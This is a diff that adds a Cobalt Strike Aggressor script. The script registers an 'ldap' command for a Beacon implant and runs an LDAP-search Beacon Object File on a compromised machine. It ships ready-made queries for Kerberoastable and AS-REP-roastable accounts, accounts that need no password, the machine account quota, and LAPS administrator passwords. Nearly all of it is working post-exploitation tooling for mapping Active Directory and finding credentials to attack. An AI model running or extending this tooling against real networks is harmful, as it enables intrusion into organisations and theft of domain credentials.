@@ -1,0 +1,213 @@
+beacon_command_register(
+    "ldap",
+    "LDAP search",
+    "
+
+All command accept these options arguments in this order
+
+[limit]      = int Number of results you want to return
+[attributes] = str Which LDAP attributes you wish to see
+[server]     = str Which LDAP server do you want to target
+[base]       = str Set the LDAP search base (i.e. DC=domain,DC=local)
+[domain]     = str Domain used for authentication
+[username]   = str The username to use for authentication
+[password]   = str The password associated with the username
+
+\"\" <- Use this for default strings
+0  <- Use this for default integers
+
+# Standard searching
+ldap <filter> [limit] [attributes] [server] [base] [domain] [username] [password]
+ldap (objectClass=user) 1 samAccountName 192.168.1.1 DC=test,DC=local test user pass
+
+# Search a username
+ldap user <username>
+(samaccountname=USERNAME)
+
+# Roastable users
+ldap roast <kerb|asrep>
+(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
+(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
+
+# Search descriptions
+ldap desc <class> <string>
+(&(objectClass=CLASS)(description=*STRING*))
+
+# Find users with UAC passwords not required
+ldap nopass
+(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
+
+# Domain Machine Account Quota
+ldap maq
+(&(objectClass=Domain)(objectCategory=Domain))
+ms-DS-MachineAccountQuota
+
+# Domain sites
+ldap sites
+(objectClass=site)
+
+# Laps password for a computer principal
+ldap laps <computername>
+(&(objectcategory=computer)(name=COMPUTERNAME))
+ms-mcs-AdmPwd
+"
+);
+
+alias ldap {
+    # Prepare local variables
+    local('$barch $handle $data $args $search $numResults $attributes $server $base $doamin $username $password')
+
+    # Catch if there's not enough arguments
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("ldap"));
+		return;
+	}
+
+    # Fetch beacon architecture
+    $barch  = barch($1);
+
+    # Read in bof for specific architecture
+    $handle = openf(script_resource("./ldap. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if($2 eq "user")
+    {
+        if(-istrue $3)
+        {
+            $search = "(samaccountname= $+ $3 $+ )";
+        }
+        else
+        {
+            berror($1, "Usage: ldap user <username>");
+            return;
+        }
+
+        $numResults = iff(-istrue $4, $4, 0);
+        #$numResults = 1;
+        $attributes = iff(-istrue $5, $5, "");
+        $server = iff(-istrue $6, $6, "");
+        $base = iff(-istrue $7, $7, "");
+        $domain = iff(-istrue $8, $8, "");
+        $username = iff(-istrue $9, $9, "");
+        $password = iff(-istrue $10, $10, "");
+    }
+    else if($2 eq "roast")
+    {
+        if((-istrue $3) && ($3 eq "kerb"))
+        {
+            $search = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
+        }
+        else if((-istrue $3) && ($3 eq "asrep"))
+        {
+            $search = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";        
+        }
+        else
+        {
+            berror($1, "Usage: ldap roast <kerb|asrep>");
+            return;
+        }
+
+        $numResults = iff(-istrue $4, $4, 0);
+        $attributes = iff(-istrue $5, $5, "");
+        $server = iff(-istrue $6, $6, "");
+        $base = iff(-istrue $7, $7, "");
+        $domain = iff(-istrue $8, $8, "");
+        $username = iff(-istrue $9, $9, "");
+        $password = iff(-istrue $10, $10, "");
+    }
+    else if($2 eq "desc")
+    {
+        if((-istrue $3) && (-istrue $4))
+        {
+            $search = "(&(objectClass= $+ $3 $+ )(description=* $+ $4 $+ *))";
+        }
+        else
+        {
+            berror($1, "Usage: ldap desc <class> <string>");
+            return;
+        }
+
+        $numResults = iff(-istrue $5, $5, 0);
+        $attributes = iff(-istrue $6, $6, "");
+        $server = iff(-istrue $7, $7, "");
+        $base = iff(-istrue $8, $8, "");
+        $domain = iff(-istrue $9, $9, "");
+        $username = iff(-istrue $10, $10, "");
+        $password = iff(-istrue $11, $11, "");
+    }
+    else if($2 eq "nopass")
+    {
+        $search = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
+        $numResults = iff(-istrue $3, $3, 0);
+        $attributes = iff(-istrue $4, $4, "");
+        $server = iff(-istrue $5, $5, "");
+        $base = iff(-istrue $6, $6, "");
+        $domain = iff(-istrue $7, $7, "");
+        $username = iff(-istrue $8, $8, "");
+        $password = iff(-istrue $9, $9, "");
+    }
+    else if($2 eq "maq")
+    {
+        $search = "(&(objectClass=Domain)(objectCategory=Domain))";
+        $numResults = iff(-istrue $3, $3, 0);
+        $attributes = iff(-istrue $4, "$4 $+ ,ms-DS-MachineAccountQuota", "ms-DS-MachineAccountQuota");
+        $server = iff(-istrue $5, $5, "");
+        $base = iff(-istrue $6, $6, "");
+        $domain = iff(-istrue $7, $7, "");
+        $username = iff(-istrue $8, $8, "");
+        $password = iff(-istrue $9, $9, "");
+    }
+    else if($2 eq "sites")
+    {
+        $search = "(objectClass=site)";
+        $numResults = iff(-istrue $3, $3, 0);
+        $attributes = iff(-istrue $4, $4, "");
+        $server = iff(-istrue $5, $5, "");
+        $base = iff(-istrue $6, $6, "");
+        $domain = iff(-istrue $7, $7, "");
+        $username = iff(-istrue $8, $8, "");
+        $password = iff(-istrue $9, $9, "");
+    }
+    else if($2 eq "laps")
+    {
+        if(-istrue $3)
+        {
+            $search = "(&(objectcategory=computer)(name= $+ $3 $+ ))";
+        }
+        else
+        {
+            berror($1, "Usage: ldap laps <computerName>");
+            return;
+        }
+
+        $numResults = iff(-istrue $4, $4, 0);
+        $attributes = iff(-istrue $5, "$5 $+ ,ms-mcs-AdmPwd", "ms-mcs-AdmPwd");
+        $server = iff(-istrue $6, $6, "");
+        $base = iff(-istrue $7, $7, "");
+        $domain = iff(-istrue $8, $8, "");
+        $username = iff(-istrue $9, $9, "");
+        $password = iff(-istrue $10, $10, "");
+    }
+    else
+    {
+        $search = $2;
+        $numResults = iff(-istrue $3, $3, 0);
+        $attributes = iff(-istrue $4, $4, "");
+        $server = iff(-istrue $5, $5, "");
+        $base = iff(-istrue $6, $6, "");
+        $domain = iff(-istrue $7, $7, "");
+        $username = iff(-istrue $8, $8, "");
+        $password = iff(-istrue $9, $9, "");
+    }
+
+    # Prepare arguments
+    $args = bof_pack($1, "zizzzzzz", $search, $numResults, $attributes, $server, $base, $domain, $username, $password);
+
+    # Announce intention
+    btask($1, "Running $barch LDAP search");
+
+    # Execute BOF
+    beacon_inline_execute($1, $data, "go", $args);
+}
